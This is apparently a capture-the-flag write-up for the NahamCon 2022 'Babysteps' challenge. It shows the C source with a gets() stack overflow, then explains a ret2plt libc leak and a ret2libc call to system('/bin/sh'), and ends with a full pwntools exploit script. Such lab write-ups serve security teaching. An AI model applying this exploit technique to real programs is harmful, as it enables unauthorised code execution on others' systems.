# Babysteps

## Table of Content

<!-- MarkdownTOC -->

- [HowTo](#howto)
  - [SourceCode](#sourcecode)
  - [Checksec](#checksec)
  - [Let's pwn it !](#lets-pwn-it-)
    - [Offset](#offset)
    - [Ret2Plt](#ret2plt)
    - [Ret2Main](#ret2main)
    - [Ret2LibC](#ret2libc)
- [Script](#script)

<!-- /MarkdownTOC -->


# HowTo

## SourceCode

On this challenge, we get sourcecode of the binary, let's see that : 

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>


#define BABYBUFFER 16

void setup(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

void whine() {
  puts("You whine: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void scream() {
  puts("You scream: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void cry() {
  puts("You cry: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void sleep() {
  puts("Night night, baby!\n");
  exit(-1);
}


void ask_baby_name() {
  char buffer[BABYBUFFER];
  puts("First, what is your baby name?");
  return gets(buffer);
}

int main(int argc, char **argv){
  setup();

  puts("              _)_");
  puts("           .-'(/ '-.");
  puts("          /    `    \\");
  puts("         /  -     -  \\");
  puts("        (`  a     a  `)");
  puts("         \\     ^     /");
  puts("          '. '---' .'");
  puts("          .-`'---'`-.");
  puts("         /           \\");
  puts("        /  / '   ' \\  \\");
  puts("      _/  /|       |\\  \\_");
  puts("     `/|\\` |+++++++|`/|\\`");
  puts("          /\\       /\\");
  puts("          | `-._.-` |");
  puts("          \\   / \\   /");
  puts("          |_ |   | _|");
  puts("          | _|   |_ |");
  puts("          (ooO   Ooo)");
  puts("");

  puts("=== BABY SIMULATOR 9000 ===");

  puts("How's it going, babies!!");
  puts("Are you ready for the adventure of a lifetime? (literally?)");
  puts("");
  ask_baby_name();

  puts("Pefect! Now let's get to being a baby!\n");

  char menu_option;

  do{

    puts("CHOOSE A BABY ACTIVITY");
    puts("a. Whine");
    puts("b. Cry");
    puts("c. Scream");
    puts("d. Throw a temper tantrum");
    puts("e. Sleep.");
    scanf(" %c",&menu_option);

    switch(menu_option){

      case 'a':
        whine();
        break;
      case 'b':
        cry();
        break;
      case 'c':
        scream();
        break;
      case 'd':
        scream();
        cry();
        whine();
        cry();
        scream();
        break;
      case 'e':
        sleep();
        break;

      default:
        puts("WAAAAAAHHHH, THAT NO-NO!!!\n");
        break;
    }

  }while(menu_option !='e');

}
```
## Checksec

Also the checksec :
```
> checksec babysteps
[*] '/home/nilgam/pentest/ctfs/nahamcon_2022/binexp/babysteps/babysteps'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

## Let's pwn it !

Okay, so the function to exploit is `ask_baby_name()`, cause of the `gets()`
And, NX disabled, so stack is executable.

Probably we could inject a shellcode into the baby name, and return on the stack for execute it.
But, as there is probably too ASLR enabled on the server... this is a no-go, cause we should bruteforce the stack address.

So here, in my opinion, the solution is following that : 

- [ret2plt](#ret2plt)
- [ret2main](#ret2main)
- [ret2libc](#ret2libc)

That means, leak the libc address, using puts@plt(), ret2main to re-run again the binary, keeping the memory in state, then return on system('/bin/sh').

This can be performed with some steps, and two rop-chains, described as below.

### Offset

As we have seen previously in Babiersteps, we need the offset which allow us to overwrite the ret address. 
In our case, we only need the wrong EIP, which is 0x61616168: 
```
offset = cyclic_find(0x61616168)
payload = cyclic(offset)
```

### Ret2Plt

This first step will give us the libc address, through the plt.got address.
To perform that, we use the most common used function for that, meaning puts@plt(puts@got).

As it's a 32bits binary, the rop-chain looks like :

- puts@plt
- pop_ret gadget
- puts@got

From that, the program will print (puts()) the puts@got address. So an address from the libc, loaded in memory, so the definitive address of the puts() function.

```py
payload += p32(elf.plt.puts)
payload += p32(rop.ebx.address)
payload += p32(elf.got.puts)
```
### Ret2Main

As the name, it's a return to main function, to allow us a second injection.
I learnt in another ctfs that it could better to not return to main, but to the binary entry point (variables initializations, all that...)
So :

- entrypoint

```py
payload += p32(elf.entrypoint)
```

From that, we already can inject this payload, and get the puts@libc leaked address :

```py
p.sendline(payload)
_ = p.recvuntil(b'baby name?\n')
leaks = p.recvline()
leak_puts = unpack(leaks[:4])
print("Leak puts @", hex(leak_puts))
```
```
Leak puts @ 0xf7de1460
```


### Ret2LibC

From the Ret2Plt payload, we get the puts() address, from the libc.
So, to compute the libc base address (which is required to perform the ret2libc, and then to get the `system('/bin/sh')` addresses), we'll use the famous [Blukat DB](https://libc.blukat.me/), which can be used in terminal ([https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database))

For sake of example, I'll use addresses and leak from my own machine, but they will be different on your own.

```
(From pwntools context 'debug')

    00000220  79 20 6e 61  6d 65 3f 0a  60 14 de f7  66 90 04 08  │y na│me?·│`···│f···│
                                        ^^^^^^^^^^^
    00000230  40 fd d8 f7  86 90 04 08  0a 20 20 20  20 20 20 20  │@···│····│·   │    │
```

As previous section, we get the puts leaked address, which is 0xf7de1460.

So, using blukat in terminal, we get all we need to pwn : 

```sh
> /opt/libc-database/find puts 0xf7de1460
ubuntu-old-glibc (libc6_2.26-0ubuntu2.1_amd64)
ubuntu-old-glibc (libc6_2.26-0ubuntu2_amd64)
debian-glibc (libc6_2.31-13+deb11u3_i386)
ubuntu-old-eglibc (libc6-i386_2.13-20ubuntu5_amd64)
> /opt/libc-database/dump libc6_2.31-13+deb11u3_i386
offset___libc_start_main_ret = 0x1ee46
offset_system = 0x00045040
offset_dup2 = 0x000f2be0
offset_read = 0x000f1f70
offset_write = 0x000f2010
offset_str_bin_sh = 0x18c338
```

```sh
> ls /opt/libc-database/db/libc6_2.31-13+deb11u3_i386*
/opt/libc-database/db/libc6_2.31-13+deb11u3_i386.info
/opt/libc-database/db/libc6_2.31-13+deb11u3_i386.so
/opt/libc-database/db/libc6_2.31-13+deb11u3_i386.symbols
/opt/libc-database/db/libc6_2.31-13+deb11u3_i386.url
```

Note that the dump command is optional, as we use this find result with pwntools.

```py
# From a first leak : 
libc = ELF('/opt/libc-database/db/libc6_2.31-13+deb11u3_i386.so')

# Or if we run locally, we can just :
# libc = elf.libc

libc.address = leak_puts - libc.symbols.puts

payload2 = cyclic(offset)
payload2 += p32(libc.symbols.system)
payload2 += p32(rop.ebx.address)
payload2 += p32(next(libc.search(b'/bin/sh')))
```

# Script

```py
from pwn import *

elf = ELF('./babysteps')
context.binary = elf
rop = ROP(elf)

offset = cyclic_find(0x61616168)

payload = cyclic(offset)
payload += p32(elf.plt.puts)
payload += p32(rop.ebx.address)
payload += p32(elf.got.puts)
payload += p32(elf.entrypoint)

print(payload)

with open('payload', 'wb+') as f:
	f.write(payload)

# with remote('challenge.nahamcon.com', 30234) as p:
with elf.process() as p:
	p.sendline(payload)

	_ = p.recvuntil(b'baby name?\n')

	leaks = p.recvline()
	leak_puts = unpack(leaks[:4])
	print("Leak puts @", hex(leak_puts))
	
	# From a first leak : 
	# libc = ELF('/opt/libc-database/db/libc6_2.15-0ubuntu10.23_i386.so')
	# libc = ELF('/opt/libc-database/db/libc6-i386_2.35-0ubuntu3_amd64.so')

	libc = elf.libc

	libc.address = leak_puts - libc.symbols.puts

	print("Libc @ ", hex(libc.address))
	print("System @ ", hex(libc.symbols.system))
	print("Bin/Sh  @ ", hex(next(libc.search(b'/bin/sh\x00'))))
	
	_ = p.recvuntil(b'baby name?\n')
	payload2 = cyclic(offset)
	payload2 += p32(libc.symbols.system)
	payload2 += p32(libc.symbols.exit)
	payload2 += p32(next(libc.search(b'/bin/sh')))
	p.sendline(payload2)
	p.interactive()
```